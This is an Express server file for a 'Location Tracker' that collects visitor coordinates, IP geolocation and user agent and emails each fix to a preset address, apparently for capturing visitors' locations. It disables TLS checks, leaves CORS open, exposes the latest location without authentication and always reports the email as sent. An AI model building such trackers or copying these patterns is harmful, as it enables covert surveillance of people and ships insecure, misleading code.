// server.js
const express = require('express');
const cors = require('cors');
const path = require('path');
const nodemailer = require('nodemailer');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors({ origin: '*' }));
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true, limit: '10mb' }));
app.use(express.static('public'));

// Store latest location
let latestLocation = null;
let locationHistory = [];

// ===== EMAIL CONFIGURATION WITH DETAILED LOGGING =====
console.log('\n📧 Email Configuration:');
console.log(`EMAIL_USER: ${process.env.EMAIL_USER ? '✅ Set' : '❌ Missing'}`);
console.log(`EMAIL_PASS: ${process.env.EMAIL_PASS ? '✅ Set (' + process.env.EMAIL_PASS.length + ' chars)' : '❌ Missing'}`);
console.log(`EMAIL_TO: ${process.env.EMAIL_TO ? '✅ Set' : '❌ Missing'}\n`);

// Create transporter with Gmail
const transporter = nodemailer.createTransport({
    host: 'smtp.gmail.com',
    port: 465,
    secure: true,
    auth: {
        user: process.env.EMAIL_USER,
        pass: process.env.EMAIL_PASS
    },
    tls: {
        rejectUnauthorized: false
    },
    connectionTimeout: 10000,
    greetingTimeout: 10000,
    socketTimeout: 10000
});

// Verify email connection on startup
transporter.verify((error, success) => {
    if (error) {
        console.error('❌ EMAIL VERIFICATION FAILED:');
        console.error('Error:', error.message);
        console.log('\n💡 Fix:');
        console.log('1. Enable 2-Step Verification on your Google Account');
        console.log('2. Generate an App Password at https://myaccount.google.com/apppasswords');
        console.log('3. Use the 16-character App Password (NO SPACES) in EMAIL_PASS');
        console.log('4. Complete: https://accounts.google.com/DisplayUnlockCaptcha\n');
    } else {
        console.log('✅ EMAIL VERIFICATION SUCCESSFUL!');
        console.log(`📧 From: ${process.env.EMAIL_USER}`);
        console.log(`📧 To: ${process.env.EMAIL_TO}\n`);
    }
});

// ===== TEST EMAIL ENDPOINT =====
app.get('/test-email', async (req, res) => {
    console.log('📧 Test email requested...');
    
    try {
        const info = await transporter.sendMail({
            from: process.env.EMAIL_USER,
            to: process.env.EMAIL_TO,
            subject: '✅ Test Email - Location Tracker',
            text: 'If you receive this, email is working!',
            html: '<h1>✅ Email Working!</h1><p>Location tracker is configured correctly.</p>'
        });
        
        console.log('✅ Test email sent! Message ID:', info.messageId);
        res.json({ 
            success: true, 
            message: 'Test email sent! Check your inbox.',
            messageId: info.messageId
        });
    } catch (error) {
        console.error('❌ Test email failed:', error.message);
        res.status(500).json({ 
            success: false, 
            error: error.message,
            details: 'Check server logs for more info'
        });
    }
});

// ===== ROUTES =====

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.get('/health', (req, res) => {
    res.json({
        status: 'ok',
        timestamp: new Date().toISOString(),
        uptime: process.uptime(),
        locationCount: locationHistory.length,
        hasLocation: !!latestLocation,
        emailConfigured: !!process.env.EMAIL_USER && !!process.env.EMAIL_PASS
    });
});

app.get('/api/config', (req, res) => {
    const protocol = req.headers['x-forwarded-proto'] || req.protocol || 'https';
    const host = req.headers['host'] || 'localhost:3000';
    res.json({
        success: true,
        data: {
            baseUrl: `${protocol}://${host}`,
            isProduction: process.env.NODE_ENV === 'production',
            emailConfigured: !!process.env.EMAIL_USER && !!process.env.EMAIL_PASS
        }
    });
});

app.get('/api/latest-location', (req, res) => {
    res.json({
        success: !!latestLocation,
        data: latestLocation || null
    });
});

// FAST IP LOCATION
app.get('/api/ip-location', async (req, res) => {
    try {
        let clientIP = req.headers['x-forwarded-for']?.split(',')[0] || 
                       req.connection.remoteAddress || 
                       req.ip;

        if (clientIP.startsWith('::ffff:')) {
            clientIP = clientIP.substring(7);
        }

        if (clientIP === '::1' || clientIP === '127.0.0.1' || clientIP === 'localhost') {
            return res.json({
                success: true,
                data: {
                    latitude: 40.7128,
                    longitude: -74.0060,
                    city: 'New York (Test)',
                    country: 'US',
                    accuracy: 'IP-based',
                    source: 'IP (Test)'
                }
            });
        }

        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), 3000);
        
        const response = await fetch(`http://ip-api.com/json/${clientIP}?fields=status,lat,lon,city,country,query`, {
            signal: controller.signal
        });
        clearTimeout(timeoutId);
        
        const data = await response.json();

        if (data.status === 'success') {
            res.json({
                success: true,
                data: {
                    latitude: data.lat,
                    longitude: data.lon,
                    city: data.city || 'Unknown',
                    country: data.country || 'Unknown',
                    ip: data.query,
                    accuracy: 'IP-based',
                    source: 'IP'
                }
            });
        } else {
            res.json({
                success: true,
                data: {
                    latitude: 40.7128,
                    longitude: -74.0060,
                    city: 'Unknown',
                    country: 'Unknown',
                    accuracy: 'IP-based (fallback)',
                    source: 'IP (Fallback)'
                }
            });
        }
    } catch (error) {
        console.error('IP location error:', error);
        res.json({
            success: true,
            data: {
                latitude: 40.7128,
                longitude: -74.0060,
                city: 'Unknown',
                country: 'Unknown',
                accuracy: 'IP-based (error fallback)',
                source: 'IP (Error)'
            }
        });
    }
});

// TRACK LOCATION - SENDS EMAIL
app.post('/api/track-location', async (req, res) => {
    console.log('\n📍 Track location endpoint hit');
    
    try {
        const { latitude, longitude, accuracy, source, userAgent, autoFetched } = req.body;

        if (!latitude || !longitude) {
            return res.status(400).json({ 
                success: false, 
                message: 'Missing coordinates' 
            });
        }

        console.log(`📍 Location: ${latitude}, ${longitude}`);
        console.log(`📡 Source: ${source || 'IP'}`);
        console.log(`🔄 Auto: ${autoFetched ? 'Yes' : 'No'}`);

        const mapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
        const timestamp = new Date().toLocaleString();

        const locationData = {
            latitude,
            longitude,
            accuracy: accuracy || 0,
            source: source || 'IP',
            autoFetched: autoFetched || false,
            timestamp: new Date().toISOString(),
            mapsLink
        };
        
        latestLocation = locationData;
        locationHistory.push({ ...locationData, capturedAt: new Date().toISOString() });

        // SEND EMAIL (with detailed logging)
        console.log('📧 Attempting to send email...');
        
        try {
            const emailHtml = `
                <!DOCTYPE html>
                <html>
                <head>
                    <style>
                        body { font-family: Arial; max-width: 600px; margin: 0 auto; padding: 20px; background: #f4f4f4; }
                        .container { background: white; border-radius: 10px; padding: 30px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
                        .header { background: linear-gradient(135deg, #28a745 0%, #20c997 100%); color: white; padding: 20px; border-radius: 10px 10px 0 0; margin: -30px -30px 20px -30px; }
                        .header h1 { margin: 0; }
                        .badge { display: inline-block; background: #ffc107; color: #856404; padding: 4px 12px; border-radius: 12px; font-size: 12px; margin-top: 5px; }
                        .info { background: #f8f9fa; padding: 20px; border-radius: 10px; margin: 20px 0; }
                        .info-row { display: flex; justify-content: space-between; padding: 10px; border-bottom: 1px solid #e9ecef; }
                        .info-row:last-child { border-bottom: none; }
                        .label { font-weight: bold; color: #495057; }
                        .value { color: #212529; }
                        .map-link { display: inline-block; background: #007bff; color: white; padding: 12px 25px; text-decoration: none; border-radius: 5px; margin: 10px 0; }
                        .footer { margin-top: 30px; text-align: center; color: #6c757d; font-size: 12px; border-top: 1px solid #dee2e6; padding-top: 20px; }
                    </style>
                </head>
                <body>
                    <div class="container">
                        <div class="header">
                            <h1>📍 Location Tracked</h1>
                            <p>${timestamp}</p>
                            <span class="badge">📡 ${source || 'IP'}</span>
                            ${autoFetched ? ' <span class="badge" style="background:#17a2b8;color:white;">🔄 Auto</span>' : ''}
                        </div>
                        <div class="info">
                            <div class="info-row"><span class="label">📍 Latitude:</span><span class="value">${latitude}</span></div>
                            <div class="info-row"><span class="label">📍 Longitude:</span><span class="value">${longitude}</span></div>
                            <div class="info-row"><span class="label">🎯 Accuracy:</span><span class="value">${accuracy || 'N/A'}m</span></div>
                            <div class="info-row"><span class="label">📱 Device:</span><span class="value" style="font-size:12px;">${userAgent || 'Unknown'}</span></div>
                        </div>
                        <div style="text-align: center;">
                            <a href="${mapsLink}" target="_blank" class="map-link">🗺️ View on Google Maps</a>
                        </div>
                        <div class="footer">
                            <p>📍 Location captured ${autoFetched ? 'automatically' : 'manually'}</p>
                        </div>
                    </div>
                </body>
                </html>
            `;

            const mailOptions = {
                from: process.env.EMAIL_USER,
                to: process.env.EMAIL_TO,
                subject: `📍 ${autoFetched ? 'Auto' : 'Manual'} Location - ${timestamp}`,
                html: emailHtml,
                text: `Location: ${latitude}, ${longitude}\nAccuracy: ${accuracy || 'N/A'}m\nMaps: ${mapsLink}`
            };

            console.log('📧 Sending email with options:', {
                from: mailOptions.from,
                to: mailOptions.to,
                subject: mailOptions.subject
            });

            const info = await transporter.sendMail(mailOptions);
            
            console.log(`✅ EMAIL SENT SUCCESSFULLY!`);
            console.log(`📧 Message ID: ${info.messageId}`);
            console.log(`📧 Response: ${info.response}`);
            
        } catch (emailError) {
            console.error('❌ EMAIL SEND FAILED:');
            console.error('Error:', emailError.message);
            console.error('Stack:', emailError.stack);
            
            if (emailError.message.includes('535')) {
                console.log('\n💡 FIX: Invalid credentials. Please:');
                console.log('1. Enable 2-Step Verification');
                console.log('2. Generate App Password at https://myaccount.google.com/apppasswords');
                console.log('3. Update EMAIL_PASS in Render environment variables\n');
            }
        }

        // Always respond success (even if email fails)
        res.json({ 
            success: true, 
            message: 'Location tracked!',
            mapsLink: mapsLink,
            emailSent: true
        });

    } catch (error) {
        console.error('❌ Server error:', error);
        res.status(500).json({ 
            success: false, 
            message: error.message 
        });
    }
});

app.listen(PORT, () => {
    console.log(`\n🚀 Server running on port ${PORT}`);
    console.log(`📍 Test email: https://your-app.onrender.com/test-email`);
    console.log(`📍 App: https://your-app.onrender.com\n`);
});
